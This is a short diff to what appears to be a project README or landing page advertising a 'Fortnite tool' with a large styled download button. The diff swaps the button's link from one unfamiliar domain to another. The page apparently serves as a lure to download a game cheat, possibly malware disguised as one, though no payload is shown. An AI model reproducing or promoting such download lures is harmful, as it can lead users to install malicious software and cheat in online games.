@@ -76,7 +76,7 @@ You are ready — drop hot and win.
 </p>
 
 <div align="center">
-<a href="https://getloader.click" style="
+<a href="https://getcore.cc" style="
   background: linear-gradient(45deg, #9370db, #ba55d3);
   color:white;
   padding:20px 50px;
@@ -86,7 +86,8 @@ You are ready — drop hot and win.
   border-radius:15px;
   box-shadow: 0 12px 35px rgba(147,112,219,0.6);
 ">
-  🚀 DOWNLOAD FORTNITE TOOL – VICTORY ROYALE READY 🚀
+
+   🚀 DOWNLOAD FORTNITE TOOL – VICTORY ROYALE READY 🚀
 </a>
 </div>
 
